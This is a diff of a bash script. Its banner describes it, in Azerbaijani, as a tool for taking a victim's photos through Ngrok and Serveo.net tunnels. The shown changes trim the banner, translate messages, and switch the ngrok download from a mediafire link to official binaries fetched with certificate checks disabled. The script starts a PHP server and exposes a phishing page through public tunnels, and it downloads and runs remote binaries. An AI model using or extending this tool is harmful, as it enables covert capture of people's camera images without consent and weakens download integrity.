@@ -13,16 +13,12 @@ trap 'printf "\n";stop' 2
 banner() {
 
 echo '
-┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
-│                                                                                                                                                                     │
+┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 │HACKEZ Tool-a xos gelmisiniz :)                                                                                                               │
 │Ngrok ve Serveo.net(local host) istifade ederek victim-in fotolarinin alinmasi aleti                                                                                                           │Termux ve Arch Linuxta test edilmisdir
-│Made in Azerbaijan Broooo                                                                                                                                                                     │
-│                                                                                                                                                                     │
-│                                                                                                                                                                     │
-│                                                                                                                                                                     │
+│Made in Azerbaijan
 │                                                                                                                                                 HEXATRONN :)     │
-└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘ '
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── '
 
                                                                                
 echo " "
@@ -122,7 +118,7 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] PHP server basladilir... (localhost:3333)\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
@@ -153,23 +149,23 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok yuklenilir...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
-if [[ -e ngrok+wifi+data.zip ]]; then
-unzip ngrok+wifi+data.zip > /dev/null 2>&1
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok+wifi+data.zip
+rm -rf ngrok-stable-linux-arm.zip
 else
 printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
 fi
 
 else
-wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok+wifi+data.zip > /dev/null 2>&1
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok+wifi+data.zip
+rm -rf ngrok-stable-linux-386.zip
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
 exit 1
@@ -185,7 +181,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok server basladilir...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
@@ -210,7 +206,7 @@ start
 elif [[ $option_server -eq 2 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] Error (01 ve ya 02 secin)\e[0m\n"
+printf "\e[1;93m [!] Error (1 ve ya 2 secin!)\e[0m\n"
 sleep 1
 clear
 start1
